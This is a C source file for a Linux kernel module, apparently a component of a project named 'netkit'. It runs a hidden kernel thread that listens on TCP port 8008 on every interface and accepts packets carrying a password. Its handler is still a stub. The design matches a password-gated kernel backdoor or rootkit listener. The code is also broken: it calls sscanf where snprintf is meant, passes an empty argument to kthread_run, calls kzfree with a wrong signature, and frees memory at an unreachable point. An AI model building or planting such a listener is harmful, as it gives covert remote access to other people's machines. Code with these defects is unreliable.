#include <linux/types.h>
#include <linux/kthread.h>
#include <linux/freezer.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/random.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/delay.h>

#include "server.h"
#include "packet.h"
#include "mutex.h"
#include "mem.h"

#define SERVER_IP "0.0.0.0"
#define SERVER_PORT 8008

#define KTHREAD_LOOP_NAME "netkit-loop"

static struct socket *server_get_socket(const char* server_ip, unsigned short server_port)
{
    static struct socket *sock;
    struct sockaddr_in addr;
    int err;

    // allocate IPv4/TCP socket
    
	err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (err != 0) {
        pr_err("[!] failed to create socket: %d\n", err);
        return ERR_PTR(err);
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = in_aton(server_ip);
    addr.sin_port = htons(server_port);

    err = kernel_bind(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (err < 0) {
        pr_err("[!] failed to bind socket: %d\n", err);
        sock_release(sock);

        return ERR_PTR(err);
    }

    return sock;
}

/**
 * yoinked from ksmbd
 * 
 * kvec_array_init() - initialize a IO vector segment
 * @new:	IO vector to be initialized
 * @iov:	base IO vector
 * @nr_segs:	number of segments in base iov
 * @bytes:	total iovec length so far for read
 *
 * Return:	Number of IO segments
 */
/*static unsigned int kvec_array_init(struct kvec *new, struct kvec *iov, unsigned int nr_segs, size_t bytes)
{
	size_t base = 0;

	while (bytes || !iov->iov_len) {
		int copy = min(bytes, iov->iov_len);

		bytes -= copy;
		base += copy;
		if (iov->iov_len == base) {
			iov++;
			nr_segs--;
			base = 0;
		}
	}

	memcpy(new, iov, sizeof(*iov) * nr_segs);
	new->iov_base += base;
	new->iov_len -= base;
	return nr_segs;
}*/

static size_t server_recv(struct socket *sock, u8* out_buf, size_t buflen, int max_retries)
{
	struct msghdr msg;
	struct kvec vec;
    int count;

    memset(&msg, '\x00', sizeof(msg));

    vec.iov_base = out_buf;
    vec.iov_len = buflen;

    pr_err("[*] kernel_recvmsg(sock: %p, msg: %p, iov: %p, segs: %d, total_read_left: %lu, flags: %d)\n", sock, &msg, &vec, 1, buflen, 0);
    count = kernel_recvmsg(sock, &msg, &vec, 1, buflen, 0);
    if (count < 0) {
        pr_err("[!] sock_recvmsg() failed (err: %d)\n", count);
    }

    return count;


	/*for (total_read = 0; total_read_left; total_read += length, total_read_left -= length) {
		try_to_freeze();

		if (!ksmbd_conn_alive(conn)) {
			total_read = -ESHUTDOWN;
			break;
		}

		//segs = kvec_array_init(iov, &iov_base, 1, total_read);

        pr_err("[*] kernel_recvmsg(sock: %p, msg: %p, iov: %p, segs: %d, total_read_left: %d, flags: %d)\n", sock, &msg, iov, segs, total_read_left, 0);
		length = kernel_recvmsg(sock, &msg, &iov_base, 1, total_read_left, 0);

		if (length == -EINTR) {
			total_read = -ESHUTDOWN;
			break;
		} else if (length == -ERESTARTSYS || length == -EAGAIN) {
			//
			 * If max_retries is negative, Allow unlimited
			 * retries to keep connection with inactive sessions.
			 //
			if (max_retries == 0) {
				total_read = length;
				break;
			} else if (max_retries > 0) {
				max_retries--;
			}

			usleep_range(1000, 2000);
			length = 0;
			continue;
		} else if (length <= 0) {
			total_read = length;
			break;
		}
	}

	return total_read;*/
}

static int server_conn_handler(void *args)
{
    const packet_t *packet = (packet_t*)args;

    pr_err("[+] received packet (password: '%s')\n", packet->password);

    // handle incoming packet
    
    return 0;
}

/**
 * Listens to connections, parses the packet and starts packet processing
 */
static int server_conn_loop(void* args)
{
    char kthread_name[29];  // strlen("netkit-conn-handler-") + 8 + 1
    unsigned int kthread_name_id;
    struct task_struct *conn_task;
    struct socket *sock;
    struct socket *client_sk;
    packet_t *packet;
    struct raw_packet *raw_packet_buf;
    int count;
    int retv = 0;

    sock = server_get_socket(SERVER_IP, SERVER_PORT);
    if (IS_ERR(sock))
    {
        pr_err("[!] failed to get socket (err: %ld)\n", PTR_ERR(sock));
        retv = PTR_ERR(sock);
        goto LAB_OUT_NO_SOCK;
    }

    retv = sock->ops->listen(sock, 10);
    if (retv < 0)
    {
        pr_err("[!] failed to listen on socket (err: %d)\n", retv);
        goto LAB_OUT;
    }

    pr_err("[+] started listening for connections\n");

    raw_packet_buf = kmalloc(sizeof(*raw_packet_buf), GFP_KERNEL);

    //while (!kthread_should_stop())
    while (true)
    {
        pr_err("[+] interating in loop lol\n");

		if (try_to_freeze())
			continue;

        retv = kernel_accept(sock, &client_sk, SOCK_NONBLOCK);
        if (retv < 0) {
			if (retv == -EAGAIN)
				schedule_timeout_interruptible(HZ / 50);  // 50ms check rate
            continue;
        }

        pr_err("[+] received connection\n");

        count = server_recv(client_sk, (u8*)raw_packet_buf, sizeof(*raw_packet_buf), -1);
        if (count < 0)
        {
            pr_err("[!] failed to read bytes from connection\n");
            continue;
        }

        packet = packet_init(raw_packet_buf, count);

        get_random_bytes(&kthread_name_id, 4);
        sscanf(kthread_name, "netkit-conn-handler-%08x", &kthread_name_id);

        pr_err("[+] starting server conn handler\n");
        conn_task = kthread_run(server_conn_handler, packet, kthread_name);
        if (IS_ERR(conn_task))
        {
            pr_err("[!] failed to start handler\n");
            continue;
        }

        sock_release(client_sk);
    }

    // raw_packet_buf is allocated after all jumps to LAB_OUT
    kzfree(raw_packet_buf, sizeof(*raw_packet_buf));

LAB_OUT:
    sock_release(sock);
LAB_OUT_NO_SOCK:
    return retv;
}

int server_kthread_stop_existing(const char *name)
{
    int retv = 0;

    pr_err("[*] stopping server...\n");

    retv = kthread_stop_by_name(name);
    if (likely(retv == -ESRCH)) {
        pr_err("[-] no existing proc found\n");
        return 0;
    } else if (unlikely(retv >= 0))
        pr_err("[+] successfully terminated existing proc\n");

    return retv;
}

/**
 * Initializes the kthread for the server
 * Return: 0 if successful
 */
int server_init()
{
    int retv = 0;
    struct task_struct *task;

    retv = server_kthread_stop_existing(KTHREAD_LOOP_NAME);
    if (retv < 0)
    {
        pr_err("[!] failed to terminate existing kthread");
        return retv;
    }

    pr_err("[*] starting server_conn_loop...\n");

    task = kthread_run(server_conn_loop, NULL, );
    if (IS_ERR(task))
        return PTR_ERR(task);
    
    return retv;
}

int server_exit()
{
    int retv = 0;

    retv = server_kthread_stop_existing(KTHREAD_LOOP_NAME);
    if (retv < 0)
        pr_err("[!] failed to terminate existing kthread");

    return retv;
}